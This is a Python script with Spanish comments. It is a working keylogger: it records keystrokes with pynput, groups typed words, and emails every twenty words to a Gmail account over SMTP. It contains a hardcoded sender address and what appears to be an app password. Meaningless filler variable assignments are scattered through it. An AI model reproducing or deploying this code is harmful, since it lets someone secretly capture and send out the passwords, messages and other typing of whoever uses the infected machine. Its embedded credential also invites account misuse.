from pynput import keyboard
import string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def crear(texto):
    m = MIMEMultipart()
    m['From'] = "jm2077rtx@gmail.com" #correo emisor
    m['To'] = "rsch2077rtx@gmail.com" # correo receptor
    m['Subject'] = "Palabras registradas" # asunto del correo
    correo = MIMEText(texto, "plain")
    
    m.attach(correo)
    
    servidormail = smtplib.SMTP("smtp.gmail.com", 587)
    servidormail.ehlo()
    servidormail.starttls()
    servidormail.ehlo()
    servidormail.login('jm2077rtx@gmail.com', 'avhhvrsukwhsnlhz') # (correo de envio , contraseña) 
    # tiene que ser dos correos propios y la contraseña debe una de desarrollo que se puede generar en adminsitracion de la cuenta 
    servidormail.sendmail('jm2077rtx@gmail.com', 'rsch2077rtx@gmail.com', m.as_string()) # (correo emisor , correo receptor, msg.as_string())
    servidormail.quit()

valoresmen = set(string.printable + "\n\r\t" + "".join(chr(i) for i in range(32, 127)))

pvalor = "" #palabra
cant = 0    #cantidad
lista = [] #lista

def presionadas(boton):
    global pvalor, cant, lista
    
    try:
        valores = boton.char
    except:
        valores = str(boton)
     
    holatr="Xd" 
    ffddf= 45
    dsds= 54
    
        
    if boton == keyboard.Key.space:
        pvalor = pvalor.strip()
        if len(pvalor) > 0:
            cant += 1
            lista.append(pvalor)
            pvalor = ""
        if cant % 20 == 0:
            print("Palabras registradas:")
            print(", ".join(lista))
            crear(", ".join(lista))
            lista = []
    elif valores in valoresmen:
        pvalor += valores
    
    dsjfe= 56
    dfdfd= 43    
        
        
with keyboard.Listener(on_press=presionadas) as listener:
    listener.join()
    
reerer= 7
sffdfdf= 8 
hola_mundo= 5   
ddffdfd= 5
sfdjvbdfbj= 64
djfsbfff=54
